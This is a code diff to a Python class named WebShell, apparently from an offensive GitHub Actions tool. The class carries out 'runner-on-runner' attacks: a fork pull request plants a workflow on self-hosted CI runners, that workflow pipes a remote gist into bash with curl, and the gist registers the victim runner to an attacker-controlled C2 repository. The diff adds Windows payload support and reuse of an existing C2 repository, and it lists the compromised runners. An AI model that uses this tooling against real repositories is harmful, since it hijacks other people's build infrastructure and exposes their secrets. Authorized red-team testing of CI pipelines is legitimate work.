@@ -47,31 +47,6 @@ class WebShell(Attacker):
 
     LINE_PATTERN = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{7}Z\s(.*)$")
 
-    @staticmethod
-    def create_ror_workflow(
-        workflow_name: str, run_name: str, gist_url: str, runner_labels: list
-    ):
-        """ """
-        yaml_file = {}
-
-        yaml_file["name"] = workflow_name
-        yaml_file["run-name"] = run_name if run_name else workflow_name
-        yaml_file["on"] = ["pull_request"]
-
-        test_job = {
-            "runs-on": runner_labels,
-            "steps": [
-                {
-                    "name": "Run Tests",
-                    "run": f"curl -sSfL {gist_url} | bash > /dev/null 2>&1",
-                    "continue-on-error": "true",
-                }
-            ],
-        }
-        yaml_file["jobs"] = {"testing": test_job}
-
-        return yaml.dump(yaml_file, sort_keys=False, default_style="", width=4096)
-
     def setup_payload_gist_and_workflow(
         self, c2_repo, target_os, target_arch, keep_alive=False
     ):
@@ -94,7 +69,15 @@ class WebShell(Attacker):
         ror_gist = self.format_ror_gist(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
+
+        if not ror_gist:
+            Output.error("Failed to format runner-on-runner Gist!")
+            return None, None
+
         gist_id, gist_url = self.create_gist("runner", ror_gist)
+
+        if not gist_url:
+            return None, None
 
         Output.info(f"Successfully created runner-on-runner Gist at {gist_url}!")
 
@@ -102,22 +85,33 @@ class WebShell(Attacker):
 
     def payload_only(
         self,
-        c2_repo: str,
         target_os: str,
         target_arch: str,
         requested_labels: list,
         keep_alive: bool = False,
+        c2_repo: str = None,
         workflow_name: str = "Testing",
         run_name: str = "Testing",
     ):
         """Generates payload gist and prints RoR workflow."""
         self.setup_user_info()
 
-        gist_id, gist_url = self.setup_payload_gist_and_workflow(
+        if not c2_repo:
+            c2_repo = self.configure_c2_repository()
+            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
+        else:
+            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
+
+        _, gist_url = self.setup_payload_gist_and_workflow(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
-        ror_workflow = WebShell.create_ror_workflow(
-            workflow_name, run_name, gist_url, requested_labels
+
+        if not gist_url:
+            Output.error("Failed to create Gist!")
+            return
+
+        ror_workflow = Payloads.create_ror_workflow(
+            workflow_name, run_name, gist_url, requested_labels, target_os=target_os
         )
 
         Output.info("RoR Workflow below:\n")
@@ -137,6 +131,7 @@ class WebShell(Attacker):
         yaml_name: str = "tests",
         workflow_name: str = "Testing",
         run_name: str = "Testing",
+        c2_repo: str = None,
     ):
         """Performs a runner-on-runner attack using the fork pull request technique.
 
@@ -155,18 +150,18 @@ class WebShell(Attacker):
             Output.error("Insufficient scopes for attacker PAT!")
             return False
 
-        ## TODO: Provide option to re-use an existing C2 repository.
-        ## Initial steps, preparing C2 and payloads
-        c2_repo = self.configure_c2_repository()
-
-        Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
+        if not c2_repo:
+            c2_repo = self.configure_c2_repository()
+            Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
+        else:
+            Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
 
         gist_id, gist_url = self.setup_payload_gist_and_workflow(
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
 
-        ror_workflow = WebShell.create_ror_workflow(
-            workflow_name, run_name, gist_url, requested_labels
+        ror_workflow = Payloads.create_ror_workflow(
+            workflow_name, run_name, gist_url, requested_labels, target_os=target_os
         )
 
         Output.info(
@@ -413,7 +408,8 @@ class WebShell(Attacker):
             name = release[0]["tag_name"]
             version = name[1:]
 
-            release_file = f"actions-runner-{target_os}-{target_arch}-{version}.tar.gz"
+            # File name varies by OS.
+            release_file = f"actions-runner-{target_os}-{target_arch}-{version}.{target_os == 'win' and 'zip' or 'tar.gz'}"
             token_resp = self.api.call_post(
                 f"/repos/{c2_repo}/actions/runners/registration-token"
             )
@@ -433,9 +429,14 @@ class WebShell(Attacker):
                     "true" if keep_alive else "false",
                     random_name,
                 )
-            elif target_os == "windows":
+            elif target_os == "win":
                 return Payloads.ROR_GIST_WINDOWS.format(
-                    registration_token, c2_repo, release_file, name
+                    registration_token,
+                    c2_repo,
+                    release_file,
+                    name,
+                    "true" if keep_alive else "false",
+                    random_name,
                 )
             elif target_os == "osx":
                 return Payloads.ROR_GIST_MACOS.format(
@@ -446,6 +447,9 @@ class WebShell(Attacker):
                     "true" if keep_alive else "false",
                     random_name,
                 )
+        else:
+            Output.error("Unable to retrieve runner version!")
+            return None
 
     def issue_command(
         self,
@@ -582,10 +586,14 @@ class WebShell(Attacker):
 
             Output.info(f"There are {len(runners)} runner(s) connected to {c2_repo}:")
             for runner in runners:
-
                 runner_name = runner["name"]
 
-                labels = ", ".join([label["name"] for label in runner["labels"]])
-                Output.tabbed(f"Name: {runner_name} - Labels: {labels}")
+                labels = ", ".join(
+                    [Output.yellow(label["name"]) for label in runner["labels"]]
+                )
+                status = runner["status"]
+                Output.tabbed(
+                    f"Name: {Output.red(runner_name)} - Labels: {labels} - Status: {Output.bright(status)}"
+                )
         else:
             Output.error("No runners connected to C2 repository!")
